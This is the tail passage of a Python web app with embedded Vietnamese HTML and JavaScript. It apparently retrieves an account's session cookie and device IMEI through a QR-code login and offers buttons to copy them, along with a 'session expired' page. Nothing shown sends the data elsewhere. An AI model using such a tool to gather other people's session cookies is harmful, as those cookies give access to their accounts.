            '<svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>' +
            '<span>SAO CHÉP IMEI + COOKIE</span>' +
        '</button>' +
        '<button class="btn-pill btn-secondary" id="copy-imei">' +
            '<svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>' +
            '<span>CHỈ SAO CHÉP IMEI</span>' +
        '</button>' +
        '<button class="btn-pill btn-secondary" id="copy-ck">' +
            '<svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>' +
            '<span>CHỈ SAO CHÉP COOKIE</span>' +
        '</button>';

    card.appendChild(resWrap);

    document.getElementById('copy-all').onclick = () => copyText(combo);
    document.getElementById('copy-imei').onclick = () => copyText(imei);
    document.getElementById('copy-ck').onclick = () => copyText(compactCookie);
}

function toggleCookie() {
    const el = document.getElementById('cookie-val');
    const btn = document.getElementById('toggle-ck');
    isCookieExpanded = !isCookieExpanded;
    if (isCookieExpanded) {
        el.className = 'data-val';
        btn.innerText = 'Thu gọn';
    } else {
        el.className = 'data-val compact';
        btn.innerText = 'Mở rộng';
    }
}

function copyText(text) {
    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(text).then(() => showToast('Đã sao chép vào bộ nhớ tạm')).catch(() => fallbackCopy(text));
    } else {
        fallbackCopy(text);
    }
}

function fallbackCopy(text) {
    const ta = document.createElement('textarea');
    ta.value = text;
    ta.style.position = 'fixed';
    ta.style.left = '-9999px';
    document.body.appendChild(ta);
    ta.select();
    try { document.execCommand('copy'); showToast('Đã sao chép'); }
    catch (e) { prompt('Sao chép:', text); }
    document.body.removeChild(ta);
}

function showToast(msg) {
    const old = document.querySelector('.toast');
    if (old) old.remove();
    const t = document.createElement('div');
    t.className = 'toast';
    t.innerHTML = '<svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg><span>' + msg + '</span>';
    document.body.appendChild(t);
    setTimeout(() => { t.remove(); }, 2000);
}

setInterval(check, 1000);
check();
</script>
</body>
</html>
"""


HTML_EXPIRED = """<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Hết Hạn Phiên</title>
<style>
""" + SHARED_CSS + """
.brand-badge { margin:0 auto 16px; }
</style>
</head>
<body>
<div class="card">
    <div class="brand-badge">
        <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
    </div>
    <h1>PHIÊN HẾT HẠN</h1>
    <p class="sub">Mã QR đã hết thời gian chờ bảo mật. Vui lòng tạo phiên mới.</p>
    <a href="/" class="btn-pill">
        <svg viewBox="0 0 24 24"><polyline points="23 4 23 10 17 10"></polyline><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"></path></svg>
        <span>TẠO MÃ QR MỚI</span>
    </a>
</div>
</body>
</html>
"""


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5001))
    app.run(host="0.0.0.0", port=port, debug=False)
